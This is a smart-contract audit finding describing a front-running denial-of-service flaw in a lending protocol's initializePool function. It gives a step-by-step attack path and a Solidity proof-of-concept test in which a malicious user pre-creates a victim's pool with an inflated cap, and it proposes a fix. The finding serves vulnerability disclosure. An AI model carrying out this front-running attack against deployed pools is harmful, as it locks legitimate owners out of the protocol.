# Any malicious user can bypass pool cap during pool initialization

### Summary

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L562-L598

A missing check in the `initializePool` function will cause a denial of service for the pool owner as a malicious user can frontrun their pool initialization transaction and create the pool with the same parameters, effectively blocking the pool owner from initializing their desired pool. Even if the pool owner set the pool cap back to what he wanted, it will block him to do anything and to create the same pool.

### Root Cause

In the `initializePool` function, there is no mechanism to prevent another user from initializing a pool with the same owner, asset, and `rateModelKey`, but with a different `poolCap`. The pool ID is derived solely from `owner`, `asset`, and `rateModelKey`, so if a malicious user calls `initializePool` with the same values for these parameters, the pool owner can be front run with a different `poolCap`.

### External pre-conditions

1. The `poolOwner` must be planning to initialize a new pool with a small `poolCap`. This vulnerability can be easily fixed by the `poolOwner` if `poolCap` is `type(uint256).max` for example. The `poolOwner` just have to set back the `poolCap` to `type(uint256).max` in this case
2. The `maliciousUser` must monitor and detect the pool initialization transaction from the `poolOwner`.

### Attack Path

1. The `protocolOwner` sets the `rateModel` for the given `RATE_MODEL_KEY` using the `setRateModel()` function.
2. The `poolOwner` attempts to initialize a new pool by calling `initializePool` with their desired `owner`, `asset`, `poolCap`, and `rateModelKey`.
3. The `maliciousUser`, monitoring the network, detects this transaction and frontruns it by calling `initializePool` with the same `owner`, `asset`, and `rateModelKey`, but with a higher `poolCap`.
4. The `maliciousUser` successfully creates the pool, blocking the `poolOwner` from initializing their desired pool, as the pool ID is already taken.
5. The `maliciousUser` deposits an amount exceeding the pool cap intended by the `poolOwner`.
6. When the `poolOwner` attempts to initialize the pool again, the transaction reverts due to the pool already being initialized.
7. The `poolOwner` tries to reset the `poolCap` to their desired value, but since the pool is already at or above this cap, no further deposits can be made.
8. The `poolOwner` cannot create any other pool with the same asset and rate model, as the pool ID is already taken, effectively locking them out of the protocol for this asset and rate model.

### Impact

The pool owner suffers a complete denial of service, as they cannot initialize their desired pool or any other pool with the same asset and rate model. This prevents the pool owner from using the protocol as intended.

### PoC

Add this function to the Pool.t.sol test file:
```solidity
    function testPOC() public {
        address maliciousUser = makeAddr("maliciousUser");
        address rateModel = address(new LinearRateModel(1e18, 2e18));
        bytes32 RATE_MODEL_KEY = 0xc6e8fa81936202e651519e9ac3074fa4a42c65daad3fded162373ba224d6ea96;
        vm.prank(protocolOwner);
        registry.setRateModel(RATE_MODEL_KEY, rateModel);
        uint256 poolId = uint256(keccak256(abi.encodePacked(poolOwner, asset1, RATE_MODEL_KEY)));

        //The pool owner try to intiliaze a new pool.
        //vm.prank(poolOwner);
        //uint256 id = pool.initializePool(poolOwner, address(asset1), 100e18, RATE_MODEL_KEY);

        //But seeing this transaction coming, the malicious user front run it with the same params, except the poolCap
        //Initial pool cap was 100e18 --> 1000e18

        vm.startPrank(maliciousUser);
        pool.initializePool(poolOwner, address(asset1), 1000e18, RATE_MODEL_KEY);

        //Then, malicious user also deposit more than initial pool cap
        asset1.mint(maliciousUser, 200e18);
        asset1.approve(address(pool), 200e18);
        pool.deposit(poolId, 200e18, maliciousUser);
        vm.stopPrank();

        //Then, the inital user transaction is revert due to front run
        vm.startPrank(poolOwner);
        vm.expectRevert(abi.encodeWithSelector(Pool.Pool_PoolAlreadyInitialized.selector, uint256(keccak256(abi.encodePacked(poolOwner, asset1, RATE_MODEL_KEY)))));
        pool.initializePool(poolOwner, address(asset1), 100e18, RATE_MODEL_KEY);
        vm.stopPrank();

        //Seeing this, the poolOwner decides to set the pool cap to what he initially wanted
        vm.prank(poolOwner);
        pool.setPoolCap(poolId, 100e18);

        //But this will have the effect to block new deposits since poolCap is already reached
        
        //Moreover poolOwner can't create a new pool since pool each owner can only create one pool with this asset and this rate model
    }
```

### Mitigation

To mitigate this issue, the msg.sender should be the `poolOwner`.

In the case where the `poolOwner` is not `msg.sender`, the `poolOwner` can be set just after by the `msg.sender`.
